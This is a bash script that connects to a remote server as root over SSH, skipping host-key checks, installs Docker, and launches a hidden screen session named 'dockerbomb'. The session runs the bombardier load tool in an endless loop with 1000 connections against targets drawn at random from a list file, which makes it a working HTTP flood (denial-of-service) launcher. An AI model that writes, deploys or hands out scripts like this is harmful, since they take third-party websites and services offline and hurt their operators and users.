#!/bin/bash

cd "${0/*}";


targetips=$(cat targets)

sship=$1
if [ "$#" -ne 1 ]; then
    echo "Please provide target IP"
    exit 1
fi

#replace key name with your own
sshkey=sshkey.key
sshuser=root

echo "ssh -oStrictHostKeyChecking=no -i $sshkey $sshuser@$sship"



ssh -oStrictHostKeyChecking=no -i $sshkey $sshuser@$sship 'echo $(hostname);killall screen'
ssh -oStrictHostKeyChecking=no -i $sshkey $sshuser@$sship 'apt-get update'
ssh -oStrictHostKeyChecking=no -i $sshkey $sshuser@$sship 'apt-get install docker* wget screen -y'
#ssh -oStrictHostKeyChecking=no -i $sshkey $sshuser@$sship 'systemctl start docker'

echo "$1"

commandexec='screen -S dockerbomb -dm bash -c '\''while true; do sleep 2; docker run -it --rm alpine/bombardier -c 1000 -d 600s -l $(TARGETS=('$targetips');RANDOM=$$$(date +%s);TARGET=${TARGETS[$RANDOM % ${#TARGETS[@]}]};echo $TARGET); done;'\'''
echo $commandexec
ssh -oStrictHostKeyChecking=no -i $sshkey $sshuser@$sship "$commandexec"
